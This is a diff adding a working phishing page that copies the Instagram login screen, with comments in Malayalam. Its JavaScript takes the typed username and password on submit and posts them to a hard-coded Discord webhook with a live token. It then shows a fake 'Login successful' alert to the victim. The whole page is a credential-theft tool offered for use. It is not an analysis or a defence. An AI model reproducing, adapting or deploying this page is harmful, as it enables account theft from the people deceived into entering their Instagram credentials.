@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* CSS - ഡിസൈൻ ഭാഗം */
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; 
+            padding-top: 10vh; 
+            height: 100vh;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        /* ലോഗോയും ടെക്സ്റ്റും ഒരുമിച്ച് നിർത്താൻ */
+        .logo-section {
+            margin-bottom: 35px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Instagram ലോഗോ - കൃത്യമായ SVG ഉപയോഗിച്ച് */
+        .insta-logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 10px;
+        }
+
+        /* Instagram എന്ന ടെക്സ്റ്റ് */
+        .insta-text {
+            font-size: 26px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 8px; 
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 40px 14px 12px; 
+            background-color: #121212;
+            border: 1px solid #363636;
+            border-radius: 8px; 
+            color: #fff;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        input::placeholder {
+            color: #737373;
+            font-size: 13px;
+        }
+
+        /* കണ്ണിന്റെ ഐക്കൺ (SVG) */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #a8a8a8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        /* കണ്ണിന്റെ ഐക്കണിന് മുകളിൽ വരയ്ക്കാൻ */
+        .toggle-password.hidden::after {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 22px;
+            background-color: #a8a8a8;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%) rotate(45deg);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 13px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px; 
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 14px;
+            opacity: 0.5; 
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .login-btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .forgot-password {
+            color: #fff;
+            font-size: 13px;
+            margin-top: 22px;
+            text-decoration: none;
+            display: block;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            color: #a8a8a8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- ലോഗോയും Instagram എന്ന ടെക്സ്റ്റും -->
+    <div class="logo-section">
+        <!-- Instagram ലോഗോ (SVG) -->
+        <svg class="insta-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="instaGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#f09433" />
+                    <stop offset="25%" stop-color="#e6683c" />
+                    <stop offset="50%" stop-color="#dc2743" />
+                    <stop offset="75%" stop-color="#cc2366" />
+                    <stop offset="100%" stop-color="#bc1888" />
+                </linearGradient>
+            </defs>
+            <path fill="url(#instaGradient)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+        </svg>
+        <!-- Instagram എന്ന ടെക്സ്റ്റ് -->
+        <div class="insta-text">Instagram</div>
+    </div>
+
+    <!-- ലോഗിൻ ഫോം -->
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Username, email address or mobile number" required>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" required>
+            <!-- കണ്ണിന്റെ ഐക്കൺ (SVG) -->
+            <span class="toggle-password" id="togglePassword">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>
+            </span>
+        </div>
+
+        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot-password">Forgotten password?</a>
+</div>
+
+<script>
+    // JavaScript - ഫങ്ഷണാലിറ്റി ഭാഗം
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const togglePassword = document.getElementById('togglePassword');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginForm = document.getElementById('loginForm');
+
+    // 1. പാസ്‌വേഡ് കാണിക്കുക/മറയ്ക്കുക (Show/Hide Password)
+    togglePassword.addEventListener('click', function() {
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            this.classList.add('hidden'); 
+        } else {
+            passwordInput.type = 'password';
+            this.classList.remove('hidden'); 
+        }
+    });
+
+    // 2. ബട്ടണിന്റെ Opacity കൂട്ടാൻ (Enable/Disable Button)
+    function checkInputs() {
+        if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+            loginBtn.classList.add('active');
+        } else {
+            loginBtn.classList.remove('active');
+        }
+    }
+
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+
+    // 3. ഫോം സബ്മിറ്റ് ചെയ്യുമ്പോൾ വിവരങ്ങൾ Discord-ലേക്ക് അയക്കാൻ
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault(); 
+
+        const username = usernameInput.value;
+        const password = passwordInput.value;
+
+        sendToDiscord(username, password);
+    });
+
+    // ഡിസ്കോർഡിലേക്ക് അയക്കാനുള്ള ഫങ്ഷൻ
+    function sendToDiscord(username, password) {
+        // നിങ്ങളുടെ Discord Webhook URL ഇവിടെ ചേർത്തിട്ടുണ്ട്
+        const webhookURL = 'https://discord.com/api/webhooks/1554529436181860432/QZGHeTHGhmuuE4dh20-w5qukEOCAx-eIU5F1R37SiMxipaOj5lVG0D-KXtdaapOhfqTE'; 
+
+        // ഡിസ്കോർഡിൽ കാണിക്കേണ്ട മെസ്സേജ് ഫോർമാറ്റ്
+        const messageData = {
+            content: `**New Login Attempt!**\n**Username/Email:** ${username}\n**Password:** ${password}`
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(messageData)
+        })
+        .then(response => {
+            if (response.ok) {
+                alert('Login successful! (വിവരങ്ങൾ അയച്ചു)');
+            } else {
+                alert('Login failed. Please try again.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Login failed. Please try again.');
+        });
+    }
+</script>
+
+</body>
+</html>
